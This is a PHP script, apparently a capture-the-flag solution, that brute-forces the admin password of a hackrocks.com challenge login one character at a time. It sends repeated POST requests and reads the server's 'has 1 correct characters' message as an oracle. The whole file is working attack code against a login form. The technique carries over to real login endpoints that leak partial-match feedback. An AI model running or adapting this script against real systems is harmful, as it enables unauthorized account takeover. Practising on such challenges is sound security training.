<?php
require 'vendor/autoload.php';

$client = new GuzzleHttp\Client(['verify' => './cacert.pem']);
$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

$correct_pwd = "";
$placeholder_pwd = "........................";

while (strlen($correct_pwd) < 24)
{
    for ($i = 0;$i < strlen($characters); $i++)
    {
        $placeholder_pwd[strlen($correct_pwd)] = $characters[$i];
        
        $response = $client->request('POST', 'https://challenges.hackrocks.com/the-chattering-programmer/login', [
            'form_params' => [
                'login' => 'admin',
                'password' => $placeholder_pwd
            ],
            'delay' => 250
        ]);
        $body = $response->getBody();

        echo "Test Password: " . $placeholder_pwd . " ->" . check_is_correct($body) . "\r\n";

        if(check_is_correct($body) === 1)
        {
            popen('cls', 'w');
            $correct_pwd .= $characters[$i];
            echo "Correct character found, current password is -> " . $correct_pwd . "\r\n";
            $placeholder_pwd = "........................";
            break;
        }
    }
}

function check_is_correct($response)
{
    return preg_match('/Password is incorrect, but it has 1 correct characters/', $response);
}
?>